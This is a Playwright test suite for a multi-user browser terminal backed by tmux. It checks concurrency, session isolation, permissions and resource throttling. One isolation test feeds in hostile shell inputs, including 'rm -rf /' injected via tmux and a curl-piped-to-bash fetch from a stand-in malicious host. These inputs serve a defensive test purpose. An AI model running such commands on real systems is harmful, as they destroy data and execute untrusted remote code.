/**
 * Multi-User Scenarios Tests
 * Tests concurrent session management, user isolation, and resource sharing
 * Validates system behavior under multiple simultaneous users
 */

import { test, expect, Browser, chromium, firefox, webkit } from '@playwright/test';
import TestEnvironment, { TestEnvironmentConfig, UserSession } from './utils/TestEnvironment';

const testConfig: TestEnvironmentConfig = {
  baseUrl: 'http://localhost:4173',
  wsProxyUrl: 'ws://localhost:8080',
  tmuxBackendUrl: 'http://localhost:8081',
  testTimeout: 120000, // Extended timeout for multi-user tests
  retryAttempts: 2
};

// User session configurations for different test scenarios
const userProfiles = {
  developer: {
    permissions: ['microphone'],
    viewport: { width: 1920, height: 1080 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'
  },
  admin: {
    permissions: ['microphone', 'clipboard-read', 'clipboard-write'],
    viewport: { width: 1600, height: 900 },
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0'
  },
  mobile: {
    permissions: ['microphone'],
    viewport: { width: 390, height: 844 },
    userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
  },
  readonly: {
    permissions: [],
    viewport: { width: 1280, height: 720 },
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0'
  }
};

test.describe('Multi-User Scenarios', () => {
  let testEnv: TestEnvironment;

  test.beforeEach(async () => {
    testEnv = new TestEnvironment(testConfig);
    await testEnv.initialize();
  });

  test.afterEach(async () => {
    if (testEnv) {
      await testEnv.cleanup();
    }
  });

  test.describe('Concurrent Session Management', () => {
    test('should handle 10 concurrent user sessions', async ({ browser }) => {
      const userCount = 10;
      const sessions: { sessionId: string; userId: string }[] = [];

      // Create multiple concurrent sessions
      const sessionPromises = [];
      for (let i = 0; i < userCount; i++) {
        const sessionId = `concurrent_user_${i}`;
        const userId = `user_${i}`;
        
        sessions.push({ sessionId, userId });
        
        sessionPromises.push(
          testEnv.createUserSession(browser, {
            sessionId,
            userId,
            ...userProfiles.developer
          })
        );
      }

      // Wait for all sessions to be created
      await Promise.all(sessionPromises);

      // Connect all sessions concurrently
      const connectionPromises = sessions.map(({ sessionId }) =>
        testEnv.connectUserSession(sessionId)
      );
      await Promise.all(connectionPromises);

      // Execute unique commands in each session concurrently
      const commandPromises = sessions.map(({ sessionId, userId }) =>
        testEnv.executeCommand(sessionId, `echo "Hello from ${userId}" > /tmp/user_${userId}.txt`, {
          timeout: 10000
        })
      );

      const results = await Promise.all(commandPromises);

      // Verify all commands succeeded
      results.forEach((result, index) => {
        expect(result.success).toBe(true);
        expect(result.executionTime).toBeLessThan(5000);
      });

      // Verify session isolation - each user should only see their own file
      const isolationPromises = sessions.map(({ sessionId, userId }) =>
        testEnv.executeCommand(sessionId, `cat /tmp/user_${userId}.txt`, {
          expectOutput: `Hello from ${userId}`
        })
      );

      const isolationResults = await Promise.all(isolationPromises);
      isolationResults.forEach(result => {
        expect(result.success).toBe(true);
      });

      // Check system metrics under load
      const metrics = await testEnv.getSystemMetrics();
      expect(metrics.activeSessions).toBe(userCount);
      expect(metrics.tmuxSessions).toBe(userCount);
      expect(metrics.memoryUsage).toBeLessThan(1000 * 1024 * 1024); // 1GB limit
    });

    test('should scale to 25 users with graceful degradation', async ({ browser }) => {
      const userCount = 25;
      const sessions: string[] = [];
      const results: any[] = [];

      // Create sessions in batches to avoid overwhelming the system
      const batchSize = 5;
      for (let batch = 0; batch < Math.ceil(userCount / batchSize); batch++) {
        const batchStart = batch * batchSize;
        const batchEnd = Math.min(batchStart + batchSize, userCount);
        
        const batchPromises = [];
        for (let i = batchStart; i < batchEnd; i++) {
          const sessionId = `scale_test_user_${i}`;
          sessions.push(sessionId);
          
          batchPromises.push(
            testEnv.createUserSession(browser, {
              sessionId,
              userId: `scale_user_${i}`,
              ...userProfiles.developer
            })
          );
        }
        
        await Promise.all(batchPromises);
        
        // Brief pause between batches
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      // Connect all sessions
      for (const sessionId of sessions) {
        try {
          await testEnv.connectUserSession(sessionId);
        } catch (error) {
          console.log(`Failed to connect session ${sessionId}: ${error}`);
        }
      }

      // Test system performance under load
      const startTime = Date.now();
      
      // Execute commands in all sessions
      const commandPromises = sessions.map(async (sessionId, index) => {
        try {
          const result = await testEnv.executeCommand(sessionId, `echo "Scale test ${index}"`, {
            timeout: 15000
          });
          return { sessionId, ...result };
        } catch (error) {
          return { sessionId, success: false, error: error.toString() };
        }
      });

      const commandResults = await Promise.all(commandPromises);
      const totalTime = Date.now() - startTime;

      // Analyze results
      const successfulCommands = commandResults.filter(r => r.success);
      const successRate = successfulCommands.length / sessions.length;
      
      // Expect high success rate (>90%) even under load
      expect(successRate).toBeGreaterThan(0.9);
      
      // Verify reasonable response times
      const avgExecutionTime = successfulCommands.reduce((sum, r) => sum + (r.executionTime || 0), 0) / successfulCommands.length;
      expect(avgExecutionTime).toBeLessThan(3000);
      
      // System should handle load within reasonable time
      expect(totalTime).toBeLessThan(30000); // 30 seconds max
      
      console.log(`Scale test results: ${successfulCommands.length}/${sessions.length} successful (${(successRate * 100).toFixed(1)}%)`);
      console.log(`Average execution time: ${avgExecutionTime.toFixed(0)}ms`);
      console.log(`Total test time: ${totalTime}ms`);
    });

    test('should handle session creation/destruction churn', async ({ browser }) => {
      const iterations = 10;
      const sessionsPerIteration = 5;
      
      for (let i = 0; i < iterations; i++) {
        const sessions: string[] = [];
        
        // Create sessions
        for (let j = 0; j < sessionsPerIteration; j++) {
          const sessionId = `churn_${i}_${j}`;
          sessions.push(sessionId);
          
          await testEnv.createUserSession(browser, {
            sessionId,
            userId: `churn_user_${i}_${j}`,
            ...userProfiles.developer
          });
        }
        
        // Connect and use sessions
        for (const sessionId of sessions) {
          await testEnv.connectUserSession(sessionId);
          await testEnv.executeCommand(sessionId, `echo "Churn test iteration ${i}"`);
        }
        
        // Clean up sessions
        for (const sessionId of sessions) {
          await testEnv.cleanupUserSession(sessionId);
        }
        
        // Brief pause between iterations
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      // Verify system resources are properly cleaned up
      const finalMetrics = await testEnv.getSystemMetrics();
      expect(finalMetrics.activeSessions).toBe(0);
      expect(finalMetrics.tmuxSessions).toBe(0);
    });
  });

  test.describe('User Isolation and Security', () => {
    test('should maintain complete session isolation between users', async ({ browser }) => {
      // Create two users with different roles
      const adminSession = await testEnv.createUserSession(browser, {
        sessionId: 'admin_isolation_test',
        userId: 'admin_user',
        ...userProfiles.admin
      });

      const devSession = await testEnv.createUserSession(browser, {
        sessionId: 'dev_isolation_test',
        userId: 'dev_user',
        ...userProfiles.developer
      });

      await Promise.all([
        testEnv.connectUserSession('admin_isolation_test'),
        testEnv.connectUserSession('dev_isolation_test')
      ]);

      // Admin creates sensitive data
      await testEnv.executeCommand('admin_isolation_test', 'echo "SECRET_ADMIN_DATA" > /tmp/admin_secret.txt');
      await testEnv.executeCommand('admin_isolation_test', 'export ADMIN_TOKEN="admin_secret_token"');

      // Developer creates their own data
      await testEnv.executeCommand('dev_isolation_test', 'echo "DEV_DATA" > /tmp/dev_file.txt');
      await testEnv.executeCommand('dev_isolation_test', 'export DEV_TOKEN="dev_token"');

      // Verify isolation - dev user cannot access admin data
      const devAccessAttempt = await testEnv.executeCommand('dev_isolation_test', 'cat /tmp/admin_secret.txt', {
        expectError: true,
        timeout: 5000
      });
      expect(devAccessAttempt.success).toBe(true); // Should fail gracefully

      const devEnvAttempt = await testEnv.executeCommand('dev_isolation_test', 'echo $ADMIN_TOKEN');
      expect(devEnvAttempt.output).not.toContain('admin_secret_token');

      // Verify admin can access their own data but not dev data
      const adminOwnAccess = await testEnv.executeCommand('admin_isolation_test', 'cat /tmp/admin_secret.txt', {
        expectOutput: 'SECRET_ADMIN_DATA'
      });
      expect(adminOwnAccess.success).toBe(true);

      const adminDevAttempt = await testEnv.executeCommand('admin_isolation_test', 'cat /tmp/dev_file.txt', {
        expectError: true
      });
      expect(adminDevAttempt.success).toBe(true); // Should fail gracefully
    });

    test('should prevent cross-session command injection', async ({ browser }) => {
      const user1Session = await testEnv.createUserSession(browser, {
        sessionId: 'security_user_1',
        userId: 'security_user_1',
        ...userProfiles.developer
      });

      const user2Session = await testEnv.createUserSession(browser, {
        sessionId: 'security_user_2',
        userId: 'security_user_2',
        ...userProfiles.developer
      });

      await Promise.all([
        testEnv.connectUserSession('security_user_1'),
        testEnv.connectUserSession('security_user_2')
      ]);

      // User 1 attempts to inject commands into User 2's session
      const injectionAttempts = [
        'echo "normal"; tmux send-keys -t other_session "rm -rf /" C-m',
        'export MALICIOUS_VAR="$(rm -rf /tmp/*)"',
        'echo "test" | tee /proc/other_user/stdin',
        '$(curl -s malicious-site.com/script.sh | bash)'
      ];

      for (const injection of injectionAttempts) {
        const result = await testEnv.executeCommand('security_user_1', injection, {
          expectError: true,
          timeout: 5000
        });
        
        // Command should be blocked or contained
        expect(result.success).toBe(true); // Handled gracefully
      }

      // Verify User 2's session is unaffected
      const user2Result = await testEnv.executeCommand('security_user_2', 'echo "User 2 safe"', {
        expectOutput: 'User 2 safe'
      });
      expect(user2Result.success).toBe(true);
    });

    test('should enforce user permission boundaries', async ({ browser }) => {
      // Create users with different permission levels
      const readonlySession = await testEnv.createUserSession(browser, {
        sessionId: 'readonly_user',
        userId: 'readonly_user',
        ...userProfiles.readonly
      });

      const adminSession = await testEnv.createUserSession(browser, {
        sessionId: 'admin_permission_test',
        userId: 'admin_permission_user',
        ...userProfiles.admin
      });

      await Promise.all([
        testEnv.connectUserSession('readonly_user'),
        testEnv.connectUserSession('admin_permission_test')
      ]);

      // Test readonly user limitations
      const readonlyWriteAttempt = await testEnv.executeCommand('readonly_user', 'echo "test" > /tmp/readonly_test.txt', {
        expectError: true
      });
      
      const readonlySystemAttempt = await testEnv.executeCommand('readonly_user', 'sudo systemctl status', {
        expectError: true
      });

      // Test admin user capabilities
      const adminWriteResult = await testEnv.executeCommand('admin_permission_test', 'echo "admin test" > /tmp/admin_test.txt');
      expect(adminWriteResult.success).toBe(true);

      const adminReadResult = await testEnv.executeCommand('admin_permission_test', 'cat /tmp/admin_test.txt', {
        expectOutput: 'admin test'
      });
      expect(adminReadResult.success).toBe(true);
    });
  });

  test.describe('Resource Management and Fair Sharing', () => {
    test('should fairly distribute system resources among users', async ({ browser }) => {
      const userCount = 8;
      const sessions: string[] = [];

      // Create multiple sessions
      for (let i = 0; i < userCount; i++) {
        const sessionId = `resource_test_${i}`;
        sessions.push(sessionId);
        
        await testEnv.createUserSession(browser, {
          sessionId,
          userId: `resource_user_${i}`,
          ...userProfiles.developer
        });
      }

      // Connect all sessions
      for (const sessionId of sessions) {
        await testEnv.connectUserSession(sessionId);
      }

      // Each user runs a CPU-intensive task concurrently
      const resourceIntensiveCommands = sessions.map((sessionId, index) =>
        testEnv.executeCommand(sessionId, `echo "Resource test ${index}" && sleep 2 && date`, {
          timeout: 15000
        })
      );

      const startTime = Date.now();
      const results = await Promise.all(resourceIntensiveCommands);
      const totalTime = Date.now() - startTime;

      // Verify fair resource distribution
      results.forEach((result, index) => {
        expect(result.success).toBe(true);
        
        // Execution times should be reasonably close (within 2x variance)
        const avgTime = results.reduce((sum, r) => sum + r.executionTime, 0) / results.length;
        expect(result.executionTime).toBeLessThan(avgTime * 2);
      });

      // System should handle all tasks without excessive delays
      expect(totalTime).toBeLessThan(10000); // Should complete within 10 seconds

      console.log(`Resource sharing test: ${userCount} users, avg time: ${results.reduce((sum, r) => sum + r.executionTime, 0) / userCount}ms`);
    });

    test('should handle memory pressure gracefully', async ({ browser }) => {
      const memoryIntensiveUserCount = 5;
      const sessions: string[] = [];

      // Create sessions that will use significant memory
      for (let i = 0; i < memoryIntensiveUserCount; i++) {
        const sessionId = `memory_test_${i}`;
        sessions.push(sessionId);
        
        await testEnv.createUserSession(browser, {
          sessionId,
          userId: `memory_user_${i}`,
          ...userProfiles.developer
        });
      }

      // Connect all sessions
      for (const sessionId of sessions) {
        await testEnv.connectUserSession(sessionId);
      }

      // Monitor memory usage before intensive operations
      const initialMetrics = await testEnv.getSystemMetrics();

      // Each user runs memory-intensive operations
      const memoryCommands = sessions.map((sessionId, index) =>
        testEnv.executeCommand(sessionId, `echo "Memory test ${index}" && yes | head -100000 | wc -l`, {
          timeout: 20000
        })
      );

      const results = await Promise.all(memoryCommands);

      // Check memory usage during operations
      const peakMetrics = await testEnv.getSystemMetrics();

      // Verify operations completed successfully
      results.forEach(result => {
        expect(result.success).toBe(true);
      });

      // Memory should increase but stay within reasonable bounds
      expect(peakMetrics.memoryUsage).toBeGreaterThan(initialMetrics.memoryUsage);
      expect(peakMetrics.memoryUsage).toBeLessThan(2000 * 1024 * 1024); // 2GB limit

      // Wait for memory cleanup
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      const finalMetrics = await testEnv.getSystemMetrics();
      
      // Memory should be released after operations
      expect(finalMetrics.memoryUsage).toBeLessThan(peakMetrics.memoryUsage * 1.2);
    });

    test('should throttle excessive resource usage', async ({ browser }) => {
      const abusiveSession = await testEnv.createUserSession(browser, {
        sessionId: 'abusive_user',
        userId: 'abusive_user',
        ...userProfiles.developer
      });

      const normalSession = await testEnv.createUserSession(browser, {
        sessionId: 'normal_user',
        userId: 'normal_user',
        ...userProfiles.developer
      });

      await Promise.all([
        testEnv.connectUserSession('abusive_user'),
        testEnv.connectUserSession('normal_user')
      ]);

      // Abusive user tries to overwhelm the system
      const abusiveCommands = [];
      for (let i = 0; i < 20; i++) {
        abusiveCommands.push(
          testEnv.executeCommand('abusive_user', `echo "Spam ${i}" && sleep 0.1`, {
            timeout: 5000
          })
        );
      }

      // Normal user performs regular operations
      const normalCommand = testEnv.executeCommand('normal_user', 'echo "Normal operation"', {
        expectOutput: 'Normal operation',
        timeout: 10000
      });

      // Both should complete, but system should throttle abusive user
      const [normalResult, ...abusiveResults] = await Promise.all([
        normalCommand,
        ...abusiveCommands
      ]);

      // Normal user should not be affected
      expect(normalResult.success).toBe(true);
      expect(normalResult.executionTime).toBeLessThan(3000);

      // Some abusive commands may be throttled or fail
      const successfulAbusive = abusiveResults.filter(r => r.success);
      const abusiveSuccessRate = successfulAbusive.length / abusiveResults.length;
      
      // System should limit abuse while allowing some commands through
      expect(abusiveSuccessRate).toBeGreaterThan(0.3); // At least 30% get through
      expect(abusiveSuccessRate).toBeLessThan(1.0); // But not all of them
    });
  });

  test.describe('Cross-Browser Multi-User Testing', () => {
    test('should support users on different browsers simultaneously', async () => {
      // Create browsers for different users
      const chromeBrowser = await chromium.launch();
      const firefoxBrowser = await firefox.launch();
      const webkitBrowser = await webkit.launch();

      try {
        // Create user sessions on different browsers
        const chromeSession = await testEnv.createUserSession(chromeBrowser, {
          sessionId: 'chrome_user',
          userId: 'chrome_user',
          ...userProfiles.developer
        });

        const firefoxSession = await testEnv.createUserSession(firefoxBrowser, {
          sessionId: 'firefox_user',
          userId: 'firefox_user',
          ...userProfiles.developer
        });

        const safariSession = await testEnv.createUserSession(webkitBrowser, {
          sessionId: 'safari_user',
          userId: 'safari_user',
          ...userProfiles.developer
        });

        // Connect all sessions
        await Promise.all([
          testEnv.connectUserSession('chrome_user'),
          testEnv.connectUserSession('firefox_user'),
          testEnv.connectUserSession('safari_user')
        ]);

        // Execute commands on different browsers
        const results = await Promise.all([
          testEnv.executeCommand('chrome_user', 'echo "Chrome user active"', {
            expectOutput: 'Chrome user active'
          }),
          testEnv.executeCommand('firefox_user', 'echo "Firefox user active"', {
            expectOutput: 'Firefox user active'
          }),
          testEnv.executeCommand('safari_user', 'echo "Safari user active"', {
            expectOutput: 'Safari user active'
          })
        ]);

        // All browsers should work correctly
        results.forEach(result => {
          expect(result.success).toBe(true);
        });

        // Test real-time collaboration
        await testCollaborativeEditing();

      } finally {
        // Clean up browsers
        await chromeBrowser.close();
        await firefoxBrowser.close();
        await webkitBrowser.close();
      }
    });

    test('should maintain consistent performance across browser types', async () => {
      const browsers = [
        { browser: await chromium.launch(), name: 'Chrome' },
        { browser: await firefox.launch(), name: 'Firefox' },
        { browser: await webkit.launch(), name: 'Safari' }
      ];

      const performanceResults: any[] = [];

      try {
        for (const { browser, name } of browsers) {
          const sessionId = `perf_${name.toLowerCase()}`;
          
          await testEnv.createUserSession(browser, {
            sessionId,
            userId: `perf_user_${name.toLowerCase()}`,
            ...userProfiles.developer
          });

          await testEnv.connectUserSession(sessionId);

          // Measure performance on each browser
          const startTime = Date.now();
          
          const commands = [
            'echo "Performance test"',
            'date',
            'pwd',
            'ls -la'
          ];

          const commandResults = [];
          for (const command of commands) {
            const result = await testEnv.executeCommand(sessionId, command);
            commandResults.push(result);
          }

          const totalTime = Date.now() - startTime;
          const avgExecutionTime = commandResults.reduce((sum, r) => sum + r.executionTime, 0) / commandResults.length;

          const perfMetrics = await testEnv.measurePerformance(sessionId);

          performanceResults.push({
            browser: name,
            totalTime,
            avgExecutionTime,
            allSuccessful: commandResults.every(r => r.success),
            ...perfMetrics
          });
        }

        // Analyze cross-browser performance
        const avgTotalTime = performanceResults.reduce((sum, r) => sum + r.totalTime, 0) / performanceResults.length;
        const avgExecutionTime = performanceResults.reduce((sum, r) => sum + r.avgExecutionTime, 0) / performanceResults.length;

        performanceResults.forEach(result => {
          // All browsers should complete successfully
          expect(result.allSuccessful).toBe(true);
          
          // Performance should be consistent (within 50% of average)
          expect(result.totalTime).toBeLessThan(avgTotalTime * 1.5);
          expect(result.avgExecutionTime).toBeLessThan(avgExecutionTime * 1.5);
          
          // All browsers should meet basic performance requirements
          expect(result.webSocketLatency).toBeLessThan(100);
          expect(result.renderTime).toBeLessThan(5000);
        });

        console.log('Cross-browser performance results:', performanceResults);

      } finally {
        // Clean up all browsers
        for (const { browser } of browsers) {
          await browser.close();
        }
      }
    });
  });

  test.describe('Load Testing and Stress Scenarios', () => {
    test('should handle rapid user connection/disconnection', async ({ browser }) => {
      const iterations = 20;
      const concurrentUsers = 3;
      
      for (let i = 0; i < iterations; i++) {
        const sessions: string[] = [];
        
        // Rapid connection phase
        const connectionPromises = [];
        for (let j = 0; j < concurrentUsers; j++) {
          const sessionId = `rapid_${i}_${j}`;
          sessions.push(sessionId);
          
          connectionPromises.push(
            (async () => {
              await testEnv.createUserSession(browser, {
                sessionId,
                userId: `rapid_user_${i}_${j}`,
                ...userProfiles.developer
              });
              await testEnv.connectUserSession(sessionId);
              return testEnv.executeCommand(sessionId, `echo "Rapid test ${i}_${j}"`);
            })()
          );
        }
        
        const results = await Promise.all(connectionPromises);
        
        // Verify connections worked
        results.forEach(result => {
          expect(result.success).toBe(true);
        });
        
        // Rapid disconnection phase
        for (const sessionId of sessions) {
          await testEnv.cleanupUserSession(sessionId);
        }
        
        // Brief pause before next iteration
        if (i < iterations - 1) {
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      // Verify system stability after stress test
      const finalMetrics = await testEnv.getSystemMetrics();
      expect(finalMetrics.activeSessions).toBe(0);
    });

    test('should maintain responsiveness under burst traffic', async ({ browser }) => {
      const burstSize = 15;
      const sessions: string[] = [];

      // Create all sessions first
      for (let i = 0; i < burstSize; i++) {
        const sessionId = `burst_user_${i}`;
        sessions.push(sessionId);
        
        await testEnv.createUserSession(browser, {
          sessionId,
          userId: `burst_user_${i}`,
          ...userProfiles.developer
        });
      }

      // Burst connection phase - all at once
      const connectionStart = Date.now();
      const connectionPromises = sessions.map(sessionId => 
        testEnv.connectUserSession(sessionId)
      );
      
      await Promise.all(connectionPromises);
      const connectionTime = Date.now() - connectionStart;

      // Burst command phase - all execute simultaneously
      const commandStart = Date.now();
      const commandPromises = sessions.map((sessionId, index) =>
        testEnv.executeCommand(sessionId, `echo "Burst command ${index}" && date`, {
          timeout: 10000
        })
      );

      const commandResults = await Promise.all(commandPromises);
      const commandTime = Date.now() - commandStart;

      // Verify burst handling
      commandResults.forEach((result, index) => {
        expect(result.success).toBe(true);
        expect(result.executionTime).toBeLessThan(5000);
      });

      // System should handle burst efficiently
      expect(connectionTime).toBeLessThan(15000); // 15s for all connections
      expect(commandTime).toBeLessThan(8000); // 8s for all commands

      // Check response time distribution
      const executionTimes = commandResults.map(r => r.executionTime);
      const avgTime = executionTimes.reduce((sum, time) => sum + time, 0) / executionTimes.length;
      const maxTime = Math.max(...executionTimes);
      
      // Reasonable distribution - max shouldn't be more than 3x average
      expect(maxTime).toBeLessThan(avgTime * 3);

      console.log(`Burst test: ${burstSize} users, connection: ${connectionTime}ms, commands: ${commandTime}ms, avg exec: ${avgTime}ms`);
    });
  });
});

// Helper function for collaborative editing test
async function testCollaborativeEditing(): Promise<void> {
  // This would test real-time collaboration features
  // For now, it's a placeholder for future implementation
  console.log('Collaborative editing test placeholder');
}